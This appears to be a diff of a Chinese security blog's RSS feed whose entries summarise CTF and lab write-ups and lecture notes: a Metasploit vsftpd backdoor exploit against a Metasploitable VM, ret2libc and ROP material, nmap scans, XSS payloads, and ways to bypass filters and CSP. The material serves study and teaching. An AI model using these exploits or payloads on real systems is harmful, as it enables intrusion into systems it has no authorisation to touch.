n$，得到密文。 把這些密文再組合起來 解密過程 把密文拆開，一個數一個數解密，設數字為 $y$，計算 $y^d\ mod\ n$，得到明文。 把這些明文再組合起來 攻擊 gmpy2 線上分解n RSACTFTool</description></item><item><title>【系統安全】ELF檔案格式</title><link>https://ja-errorpro.codes/posts/2023/elf/</link><pubDate>Wed, 25 Oct 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/elf/</guid><description>ELF檔案格式 ELF(Executable and Linkable Format) 可執行可連結格式 定義：/usr/include/elf.h 類型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 &amp;gt; gcc a.c -o a.o &amp;gt; gcc b.c -static -o b.o &amp;gt; gcc c.c -c -o c.o &amp;gt; gcc d.c -fPIC d.c -o d.o &amp;amp;&amp;amp; gcc d.o -shared -o d.so ##### &amp;gt; file a.o a.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), dynamically linked, not stripped &amp;gt; file b.</description></item><item><title>【系統安全】Linux 安全機制</title><link>https://ja-errorpro.codes/posts/2023/linux_system_security/</link><pubDate>Sun, 22 Oct 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/linux_system_security/</guid><description>Address space layout randomization(ASLR): 記憶體隨機載入，會把.stack section, .so section, mmap()隨機化，可以防止攻擊者跳到指定記憶體任意利用
-繞過：目前沒有很好的繞過方法，只能靠運氣猜記憶體在哪
-Stack Canary: 金絲雀，在以前礦工在挖礦的時候會帶一隻金絲雀下去，如果金絲雀暈倒表示可能挖到有毒氣體了，要趕快跑，在程式裡面也會有這樣的機制，每次執行一個函數會先養一隻金絲雀(一個隨機數)，如果攻擊者傷害到那隻金絲雀(覆寫掉隨機數)就表示受到攻擊，程式在函式離開前檢查到就會直接停止
-繞過：只要不碰到金絲雀，或推算出金絲雀長什麼樣子就能繞過
-No-eXecute(NX): 堆疊不可執行，把記憶體的stack標記為不可執行，可以防止攻擊者跳到堆疊任意寫程式
-繞過：不要跳到stack，那跳到text就好了
-PIE(Position Independent Executable): 記憶體隨機化，跟ASLR很像，但是是在編譯器上做好，會把.text section, .data section, .bss section隨機化
-繞過：讓程式執行的過程中洩露記憶體然後就能推算
-程式實際位址 = 程式加載位址 + 偏移位址
-Fortify Source: 在編譯時檢查是否存在buffer overflow，並將危險函式替換成安全函式，例如strcpy()會被替換成strncpy()
-RELRO(RELocation Read-Only): 在Lazy Binding時，會將.got.plt section設為read-only，可以防止攻擊者修改.got.plt section</description></item><item><title>【系統安全】組合語言</title><link>https://ja-errorpro.codes/posts/2023/asm/</link><pubDate>Sun, 22 Oct 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/asm/</guid><description>組合語言 編譯流程 詞法分析 (Lexical Analysis) 切token -&amp;gt; 詞素 (Lexeme)
-語法分析 (Syntax Analysis) 建立語法樹 (Syntax Tree)
-語意分析 (Semantic Analysis) 用語法樹跟符號表 (Symbol Table) 來檢查語意
-中間碼產生 (Intermediate Code Generation)
-最佳化 (Optimization)
-目標碼產生 (Code Generation)
-GCC編譯流程 前置處理 (Preprocessing) -&amp;gt; 編譯 (Compilation) -&amp;gt; 組譯 (Assembly) -&amp;gt; 連結 (Linking) 檔案副檔名 (.i) (.s) (.o) (.out) 指令參數 -E -S -c 前置處理 (Preprocessing) 遞迴處理所有 #include 遞迴展開所有 #define 刪除所有註解 處理所有 #if #ifdef #ifndef #else #endif 行號記錄 編譯 (Compilation) 組語格式：預設 AT&amp;amp;T 語法，可用 -masm=intel 改成 Intel 語法</description></item><item><title>【CTF-WriteUp】PicoCTF-Here's a LIBC</title><link>https://ja-errorpro.codes/posts/2023/ctf_picoctf_heresalibc/</link><pubDate>Fri, 20 Oct 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/ctf_picoctf_heresalibc/</guid><description>題目：
-給你指定的libc與elf file請pwn掉它 概念： 組合語言課學的各種東西 逆向工程 Little endian stack frame ELF format ret2libc 題解： 執行 file 查看檔案屬性 這是一個64位ELF格式可執行檔
-執行 checksec 查看安全屬性 只開了 NX(No-Execute, 堆疊不可執行)
-拿去Ghidra或IDA逆向 看起來會用到的函式：
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 char convert_case(char c, int f){ char ret; if( c &amp;lt; &amp;#39;a&amp;#39; || c &amp;gt; &amp;#39;z&amp;#39; ){ if( c &amp;lt; &amp;#39;A&amp;#39; || c &amp;gt; &amp;#39;Z&amp;#39; ) ret = a; else if(f % 2 == 0) ret = a; else ret = a + 32; } else if( f % 2 == 0 ) ret = a - 32; else ret = a; return ret; } void do_stuff(){ char garbage; char str[112]; scanf(&amp;#34;%[^\n]&amp;#34;, str); scanf(&amp;#34;%c&amp;#34;, &amp;amp;garbage); for(int i = 0; i &amp;lt; 100 ; i++){ str[i] = convert_case(str[i], i); } puts(str); } void main(){ .</description></item><item><title>【資訊安全】Metasploitable3 環境建置(Windows VMware)</title><link>https://ja-errorpro.codes/posts/2022/metasploitable3_installation/</link><pubDate>Tue, 29 Nov 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/metasploitable3_installation/</guid><description>需求 Windows 10 up VMware Workstation Pro 良好的網路環境 1. 下載並安裝 Vagrant &amp;amp; Vagrant VMware Utility Vagrant 是建置虛擬機的工具，透過 Vagrantfile 來設定虛擬機。
-Download Vagrant
-Download Vagrant VMware Utility
-2. 快速建置 打開 PowerShell，cd 到適當的資料夾，依序輸入
-1 2 3 4 mkdir metasploitable3-workspace cd metasploitable3-workspace Invoke-WebRequest -Uri &amp;#34;https://raw.githubusercontent.com/rapid7/metasploitable3/master/Vagrantfile&amp;#34; -OutFile &amp;#34;Vagrantfile&amp;#34; vagrant up --provider=vmware_desktop 等待一段時間，完成後可以在
-C:\Users\{username}\.vagrant.d\boxes\xxx\yyy\vmware_desktop\ 下看到 box 檔案。
-將 vmware_desktop 資料夾複製到適當的地方，接著打開 VMWare，在 Library 下按右鍵點選 Scan for Virtual Machines，選擇剛剛複製的資料夾，就可以使用 Metasploitable3 了。</description></item><item><title>【資訊安全】Metasploitable2 滲透測試實作(筆記)</title><link>https://ja-errorpro.codes/posts/2022/metasploitable2_vsftpd/</link><pubDate>Wed, 23 Nov 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/metasploitable2_vsftpd/</guid><description>先備知識 知道如何使用 VMware 或 VirtualBox Kali Linux 基本操作 能夠讓 Kali 連線至 Metasploitable2 Metasploitable2 一種充滿漏洞的Linux系統，適合用於練習滲透測試。
-可直接到 Sourceforge 上下載虛擬機檔。
-偵查 開啟 Metasploitable2，會先要求輸入帳號密碼，帳密都是 msfadmin (輸入密碼時不會顯示在螢幕上)。
-輸入 ifconfig 查看 IP 位址，假設為 192.168.235.130。
-打開 Kali Linux (IP為192.168.235.128)，終端輸入 msfconsole 進入 Metasploit。
-使用 nmap 掃描可以連的 port 1 msf6 &amp;gt; nmap -sV 192.168.235.130 可以看到有一大堆 port 是開著的
-滲透 看看 vsftpd 有沒有洞，在 msf 中輸入 search vsftpd，可以看到有一個 exploit 可以使用 使用這個 exploit，用 show options 可以看到這個 exploit 需要的參數，然後用 set 參數 值 設定一些參數。 1 2 3 msf6 &amp;gt; use exploit/unix/ftp/vsftpd_234_backdoor msf6 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; show options msf6 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; set RHOSTS 192.</description></item><item><title>【CTF-WriteUp】PicoCTF-file-run2</title><link>https://ja-errorpro.codes/posts/2022/ctf_picoctf_file_run2/</link><pubDate>Tue, 04 Oct 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/ctf_picoctf_file_run2/</guid><description>題目：
-給你一個檔案，執行它時輸入&amp;quot;Hello!&amp;quot;(不含引號)。 概念： 逆向工程 Linux 指令操作 Linux 權限控制 題解 丟進IDA看看，發現確實只要輸入Hello!就能跑出Flag，
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 main(int param_1,long param_2){ int var1; if ((param_1 &amp;lt; 2) || (2 &amp;lt; param_1)) { puts(&amp;#34;Run this file with only one argument.&amp;#34;); } else { var1 = strcmp(*(char **)(param_2 + 8),&amp;#34;Hello!&amp;#34;); if (var1 == 0) { printf(&amp;#34;The flag is: %s&amp;#34;,flag); } else { puts(&amp;#34;Won\&amp;#39;t you say \&amp;#39;Hello!</description></item><item><title>gdb 除錯工具學習</title><link>https://ja-errorpro.codes/posts/2022/gdb/</link><pubDate>Mon, 26 Sep 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/gdb/</guid><description>What is GDB? gdb全名為gnu debugger，是一種動態Debug的工具。
-使用 我們可以先寫一個簡易的Hello World，並宣告一些變數
-1 2 3 4 5 6 7 8 # include&amp;lt;stdio.h&amp;gt; int main(){ int a = 5; int b = a * 6; int c = b + 4; printf(&amp;#34;Hello World\n&amp;#34;); return 0; } 記得在編譯時加上參數 -g，否則gdb將提示找不到除錯符，加了只差在程式大小會變大。
-1 2 $ gcc -g hello.c -o hello $ gdb ./hello 指令 指令 簡寫 簡述 help h 查看指令說明 list l 印出程式碼 file 開啟檔案 run r 執行程式 kill 停止程式 breakpoint b, bre, break 設定斷點 ex: b 15表示執行到第15行 continue c, cont 繼續執行 next n 步過(遇到呼叫函式會將該函式當成一條指令執行) step s 步入(遇到呼叫函式會進入函式一步一步執行) print p 印出變數的值 ex: p num display 每次步過/入後印出變數值 ex: display num info 查看特定資訊 ex: info break查看設了哪些斷點，不輸入參數可查詢指令 quit q 離開gdb，或按Ctrl+C &amp;lt;Click&amp;gt; Enter 執行上一條指令</description></item><item><title>【CTF-WriteUp】EasyCTF-adder</title><link>https://ja-errorpro.codes/posts/2022/ctf_easyctf_adder/</link><pubDate>Sat, 12 Mar 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/ctf_easyctf_adder/</guid><description>題目：
-給你一個加法程式，找出Flag adder
-概念： 反編譯 題解 在linux執行程式，看到要你輸入三個數，先隨意輸入，發現輸出nope。
-開啟反編譯工具Ghidra對檔案反編譯，發現在main函式中的flag前綴，
-而只要讓該行上面的if條件成立應該就能得到flag，顯然我們只要輸入三個數讓他加起來等於 0x539 即可。
-透過簡單的進位換算，得$539_{16}\ =\ 1337_{10}$
-開啟程式輸入1337 0 0 就可以拿到flag了~</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ctf on ErrorPro</title><link>https://ja-errorpro.codes/tags/ctf/</link><description>Recent content in Ctf on ErrorPro</description><generator>Hugo</generator><language>zh-Hant-TW</language><lastBuildDate>Thu, 05 Sep 2024 00:00:00 +0800</lastBuildDate><atom:link href="https://ja-errorpro.codes/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>【HTB Machine】Valentine</title><link>https://ja-errorpro.codes/posts/HTB/Valentine/</link><pubDate>Thu, 05 Sep 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/HTB/Valentine/</guid><description>&lt;h1 id="htb-machinevalentine">【HTB Machine】Valentine&lt;/h1>
+&lt;pre tabindex="0">&lt;code>LHOST: 10.10.16.13
+RHOST: 10.129.11.184
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -sCV 10.129.11.184
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/valentine/image1.png" alt="image1">&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap --script vuln 10.129.11.184
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://ja-errorpro.codes/images/htb/valentine/image2.png" alt="image2">&lt;/p></description></item><item><title>【AIS3】API 安全</title><link>https://ja-errorpro.codes/posts/2024/ais3_d4_1/</link><pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d4_1/</guid><description>&lt;h1 id="api-安全">API 安全&lt;/h1>
+&lt;p>&lt;code>-中華資安國際 資安研究員 zodius&lt;/code>&lt;/p>
+&lt;h2 id="技術簡介">技術簡介&lt;/h2>
+&lt;h3 id="what-is-api">What is API?&lt;/h3>
+&lt;ul>
+&lt;li>點炒飯
+&lt;ul>
+&lt;li>跟廚師說一份炒飯&lt;/li>
+&lt;li>叫廚師打蛋切菜&amp;hellip;&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="好處">好處&lt;/h3>
+&lt;blockquote>
+&lt;p>把商業邏輯或業務邏輯封裝成簡單邏輯&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>本質：封裝
+&lt;ul>
+&lt;li>無需關注細節，專注自己業務邏輯&lt;/li>
+&lt;li>透過介面溝通，可同時開發&lt;/li>
+&lt;li>前後端邏輯分離，減少流量與資料相依性&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="api-發展">API 發展&lt;/h3>
+&lt;ul>
+&lt;li>RPC
+&lt;ul>
+&lt;li>跨電腦溝通, ex: 轉帳、查詢&lt;/li>
+&lt;li>隨 http 發展演變成 Web service&lt;/li>
+&lt;li>專注於特定任務&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>SOAP 傳輸
+&lt;ul>
+&lt;li>XML 格式協議&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>WSDL 約定 interface
+&lt;ul>
+&lt;li>web service&lt;/li>
+&lt;li>提供參數&lt;/li>
+&lt;li>缺點 - GetFile() 可能很多種定義&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>範圍混亂，如何拆分沒有統一標準&lt;/li>
+&lt;/ul>
+&lt;h3 id="soap">SOAP&lt;/h3>
+&lt;ul>
+&lt;li>header - 方法&lt;/li>
+&lt;li>body - 正式請求&lt;/li>
+&lt;/ul>
+&lt;p>Google hacking wsdl 可能可以找到很多酷東西&lt;/p></description></item><item><title>【AIS3】Cloud Security</title><link>https://ja-errorpro.codes/posts/2024/ais3_d4_2/</link><pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d4_2/</guid><description>&lt;h1 id="cloud-security">Cloud Security&lt;/h1>
+&lt;p>&lt;code>-中華資安國際 資安研究員 黃聖筌 Husky&lt;/code>&lt;/p>
+&lt;h2 id="雲端基本介紹">雲端基本介紹&lt;/h2>
+&lt;h3 id="為啥上雲">為啥上雲&lt;/h3>
+&lt;ul>
+&lt;li>實現靈活的資應用
+&lt;ul>
+&lt;li>幫助企業降低成本支出&lt;/li>
+&lt;li>按一按就可以升級
+&lt;blockquote>
+&lt;p>資安沒做好還是會噴$$&lt;/p>
+&lt;/blockquote>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>降低行業入門門檻
+&lt;ul>
+&lt;li>節省實體硬體成本&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>專注於業務發展
+&lt;ul>
+&lt;li>不須管理硬體與伺服器維運&lt;/li>
+&lt;li>故障機率低 &lt;del>除了前幾天的 Azure&lt;/del>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>安全?
+&lt;ul>
+&lt;li>不安全&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="雲端介紹">雲端介紹&lt;/h3>
+&lt;h4 id="責任">責任&lt;/h4>
+&lt;p>出問題時可以踢皮球&lt;/p>
+&lt;h4 id="責任歸屬">責任歸屬&lt;/h4>
+&lt;ul>
+&lt;li>使用者永遠保有下面責任
+&lt;ul>
+&lt;li>資料&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h4 id="csa-top11httpsblogbarracudacom20220620csa-identifies-top-11-cloud-security-impediments">&lt;a href="https://blog.barracuda.com/2022/06/20/csa-identifies-top-11-cloud-security-impediments">CSA Top11&lt;/a>&lt;/h4>
+&lt;ol>
+&lt;li>Insufficient identity, credentials, access, and key Management&lt;/li>
+&lt;li>Insecure interfaces and application programming interfaces (APIs)&lt;/li>
+&lt;li>Misconfiguration and inadequate change control&lt;/li>
+&lt;li>Lack of cloud security architecture and strategy&lt;/li>
+&lt;li>Insecure software development&lt;/li>
+&lt;li>Unsecured third-party resources&lt;/li>
+&lt;li>System vulnerabilities&lt;/li>
+&lt;li>Accidental cloud data disclosure&lt;/li>
+&lt;li>Misconfiguration and exploitation of serverless and container workloads&lt;/li>
+&lt;li>Organized crime/hackers/advanced persistent threats (APTs)&lt;/li>
+&lt;li>Cloud storage data exfiltration&lt;/li>
+&lt;/ol>
+&lt;p>&lt;a href="https://blog.barracuda.com/2022/06/20/csa-identifies-top-11-cloud-security-impediments">https://blog.barracuda.com/2022/06/20/csa-identifies-top-11-cloud-security-impediments&lt;/a>&lt;/p></description></item><item><title>【AIS3】前端不只有 alert 可以彈</title><link>https://ja-errorpro.codes/posts/2024/ais3_d4_3/</link><pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d4_3/</guid><description>&lt;h1 id="前端不只有-alert-可以彈">前端不只有 alert 可以彈&lt;/h1>
+&lt;p>&lt;code>-DEVCORE 資安研究員 黃志仁 splitline&lt;/code>&lt;/p>
+&lt;h2 id="安全原則">安全原則&lt;/h2>
+&lt;ul>
+&lt;li>同源政策
+&lt;ul>
+&lt;li>A 網站不能讀 B 網站的東西(Browser 層限制)&lt;/li>
+&lt;li>可能可以寫&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="csrfcross-site-request-forgery">CSRF(Cross-Site Request Forgery)&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>superlogout.com&lt;/code>
+&lt;ul>
+&lt;li>點進去會把一堆服務登出，按進去請小心&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>偽造 client 端的惡意請求&lt;/li>
+&lt;li>即使使用 POST 也有機會被攻擊&lt;/li>
+&lt;/ul>
+&lt;h3 id="csrf-token">CSRF Token&lt;/h3>
+&lt;ul>
+&lt;li>使用者訪問網站時被設定一個 token 放在 cookie&lt;/li>
+&lt;li>發送請求需同時送出 token&lt;/li>
+&lt;/ul>
+&lt;h3 id="不能-csrf-的情況">不能 CSRF 的情況&lt;/h3>
+&lt;ul>
+&lt;li>非 GET 或 POST 請求&lt;/li>
+&lt;li>特殊 HTTP header&lt;/li>
+&lt;li>Samesite Cookie
+&lt;ul>
+&lt;li>Lax
+&lt;ul>
+&lt;li>只有 &lt;code>&amp;lt;a&amp;gt;、&amp;lt;link&amp;gt;、&amp;lt;form method=&amp;quot;GET&amp;quot;&amp;gt;&lt;/code> 會帶 cookie&lt;/li>
+&lt;li>在 Chrome、Edge 上預設&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Strict
+&lt;ul>
+&lt;li>不論如何都不會從其他地方把 cookie 帶過來&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>None
+&lt;ul>
+&lt;li>不論如何都會帶 cookie&lt;/li>
+&lt;li>新版標準需要帶 Secure&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="xss">XSS&lt;/h2>
+&lt;ul>
+&lt;li>Cross-Site Scripting&lt;/li>
+&lt;li>讓使用者瀏覽器執行駭客給的任意 Script&lt;/li>
+&lt;/ul>
+&lt;h3 id="self-xss">Self-XSS&lt;/h3>
+&lt;ul>
+&lt;li>自己手動把 Script 跑起來&lt;/li>
+&lt;/ul>
+&lt;h3 id="xss-category">XSS Category&lt;/h3>
+&lt;ul>
+&lt;li>Reflected XSS
+&lt;ul>
+&lt;li>惡意輸入一次性的映射 (Reflect) 到網頁上&lt;/li>
+&lt;li>ex: 搜尋欄輸入 &lt;code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code> 後按下搜尋彈出 alert&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Stored XSS
+&lt;ul>
+&lt;li>伺服器會儲存 (store) 駭客的惡意輸入&lt;/li>
+&lt;li>ex: 留言板有惡意腳本，所有人看到都會執行&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>DOM-based XSS
+&lt;ul>
+&lt;li>JavaScript 讀取惡意輸入造成 XSS&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="event-handler">Event Handler&lt;/h3>
+&lt;ul>
+&lt;li>&lt;code>&amp;lt;svg/onload=alert(1)&amp;gt;&lt;/code>&lt;/li>
+&lt;li>&lt;code>&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/code>&lt;/li>
+&lt;li>&lt;code>&amp;lt;input onfocus=alert(1)&amp;gt;&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="javascript-scheme">javascript: Scheme&lt;/h3>
+&lt;ul>
+&lt;li>&lt;code>&amp;lt;a href=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;click me&amp;lt;/a&amp;gt;&lt;/code>&lt;/li>
+&lt;li>location.replace(&amp;lsquo;javascript:alert(1)&amp;rsquo;)&lt;/li>
+&lt;/ul>
+&lt;h2 id="防禦">防禦&lt;/h2>
+&lt;ul>
+&lt;li>Blacklist: 空格，可以這樣繞過
+&lt;ul>
+&lt;li>TAB&lt;/li>
+&lt;li>Newline&lt;/li>
+&lt;li>/&lt;/li>
+&lt;li>JSFuck&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="what-can-xss-do-exactly">What can XSS do exactly&lt;/h3>
+&lt;ul>
+&lt;li>偷 cookie(無 HttpOnly flag)&lt;/li>
+&lt;li>偽造請求，不受 CSRF 限制&lt;/li>
+&lt;li>偷各種資訊&lt;/li>
+&lt;/ul>
+&lt;h3 id="prevent">prevent&lt;/h3>
+&lt;ul>
+&lt;li>Escape HTML / Javascript (Too Hard)&lt;/li>
+&lt;li>&lt;a href="https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/">https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h3 id="csp">CSP&lt;/h3>
+&lt;ul>
+&lt;li>Content Security Policy&lt;/li>
+&lt;li>瀏覽器根據 CSP 控制對外部的請求&lt;/li>
+&lt;li>Response Header
+&lt;ul>
+&lt;li>Content-Security-Policy: &amp;hellip;&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Meta Tag
+&lt;ul>
+&lt;li>&lt;code>&amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;...&amp;quot;&amp;gt;&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/&lt;/a>&lt;/li>
+&lt;li>Directive
+&lt;ul>
+&lt;li>default-src&lt;/li>
+&lt;li>img-src&lt;/li>
+&lt;li>style-src&lt;/li>
+&lt;li>script-src&lt;/li>
+&lt;li>frame-src&lt;/li>
+&lt;li>connect-src&lt;/li>
+&lt;li>&amp;hellip;&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="csp-bypass">CSP Bypass&lt;/h3>
+&lt;ul>
+&lt;li>base tag&lt;/li>
+&lt;li>script gadget
+&lt;ul>
+&lt;li>DOM Based XSS&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>whitelisted CDN/Host
+&lt;ul>
+&lt;li>&lt;a href="https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html">https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md">https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="dom-clobbering">DOM Clobbering&lt;/h2>
+&lt;h3 id="click-a-button-by-javascript">Click a button By Javascript&lt;/h3>
+&lt;ul>
+&lt;li>&lt;code>&amp;lt;button's id&amp;gt;.click()&lt;/code>&lt;/li>
+&lt;li>DOM 可控制 JavaScript 變數
+&lt;ul>
+&lt;li>id 可蓋掉 windows.*&lt;/li>
+&lt;li>name 可蓋掉 windows.&lt;em>, document.&lt;/em>&lt;/li>
+&lt;li>&lt;code>&amp;lt;a id=&amp;quot;abc&amp;quot; href=&amp;quot;https://ja-errorpro.codes&amp;quot;/&amp;gt;&lt;/code> -&amp;gt; alert(abc)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul></description></item><item><title>【AIS3】Gadget 不只有 POP 可以用</title><link>https://ja-errorpro.codes/posts/2024/ais3_d3_3/</link><pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d3_3/</guid><description>&lt;h1 id="gadget-不只有-pop-可以用">Gadget 不只有 POP 可以用&lt;/h1>
+&lt;p>&lt;code>-undefined 戰隊 林宇翔&lt;/code>&lt;/p>
+&lt;h2 id="rop-gadgets">ROP gadgets&lt;/h2>
+&lt;p>&lt;a href="https://ja-errorpro.codes/posts/2024/stack_overflow/#rop">【系統安全】Stack Overflow &lt;/a>&lt;/p>
+&lt;h2 id="basic-rop">Basic ROP&lt;/h2>
+&lt;h3 id="lab01-solution">lab01 solution&lt;/h3>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
